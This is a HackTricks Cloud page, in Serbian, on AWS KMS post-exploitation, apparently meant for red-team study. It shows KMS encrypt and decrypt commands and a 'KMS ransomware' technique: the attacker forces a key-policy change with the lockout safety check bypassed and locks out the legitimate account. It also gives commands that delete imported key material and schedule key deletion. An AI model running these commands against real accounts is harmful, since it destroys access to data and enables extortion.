# AWS - KMS Post Exploitation

{% hint style="success" %}
Naučite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## KMS

Za više informacija pogledajte:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### Šifrovanje/Dešifrovanje informacija

* Korišćenje **simetričnog** ključa
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* Korišćenje **asimetričnog** ključa:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
{% hint style="warning" %}
Ako dobijate grešku 'An error occurred (InvalidCiphertextException) when calling the Decrypt operation:' prilikom pokušaja da izvršite kms decrypt, pokušajte da koristite **`--ciphertext-blob file://`** umesto **`fileb://`**.

Korišćenje **`file://`** vam omogućava pogodnost korišćenja fajlova napisanih u vašem preferiranom kodiranju kada koristite CLI.
U verzijama 1.6.3 i novijim verzijama CLI-a, imate pristup drugom načinu za prosleđivanje sadržaja fajla CLI-u, **`fileb://`**. Radi slično kao **`file://`**, ali umesto da čita sadržaj fajla kao tekst, čita ga kao binarni.

U većini slučajeva, **`file://`** će zadovoljiti vašu potrebu za prosleđivanjem sadržaja fajla kao ulaz. Međutim, postoje neki slučajevi gde **`fileb://`** mora biti korišćen da bi se sadržaj fajla prosledio kao binarni umesto kao tekst.
Pročitajte više od AWS-a ovde: [AWS Blog - Best Practice for Local File Parameters](https://aws.amazon.com/blogs/developer/best-practices-for-local-file-parameters/)
{% endhint %}

### KMS Ransomware

Napadač sa privilegovanim pristupom nad KMS-om mogao bi da izmeni KMS politiku ključeva i **dodeli svom nalogu pristup nad njima**, uklanjajući pristup dodeljen legitimnom nalogu.

Tada, korisnici legitimnog naloga neće moći da pristupe bilo kojoj informaciji bilo koje usluge koja je šifrovana tim ključevima, stvarajući jednostavan ali efikasan ransomware nad nalogom.

{% hint style="warning" %}
Napomena da **AWS upravljani ključevi nisu pogođeni** ovim napadom, samo **klijentski upravljani ključevi**.

Takođe napomena o potrebi korišćenja parametra **`--bypass-policy-lockout-safety-check`** (nedostatak ove opcije u web konzoli čini ovaj napad mogućim samo iz CLI-a).
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
Imajte na umu da ako promenite tu politiku i date pristup samo eksternom nalogu, a zatim sa ovog eksternog naloga pokušate da postavite novu politiku da **vratite pristup originalnom nalogu, nećete moći**.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

#### Global KMS Ransomware

Postoji još jedan način za izvođenje globalnog KMS Ransomware-a, koji bi uključivao sledeće korake:

* Kreirajte novi **ključ sa ključnim materijalom** koji je uvezao napadač
* **Ponovo šifrujte starije podatke** šifrovane prethodnom verzijom sa novom.
* **Obrišite KMS ključ**
* Sada samo napadač, koji ima originalni ključni materijal, može da dešifruje šifrovane podatke

### Destroy keys
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
Napomena da AWS sada **sprečava prethodne akcije da se izvrše sa naloga u drugom vlasništvu:**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Naučite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
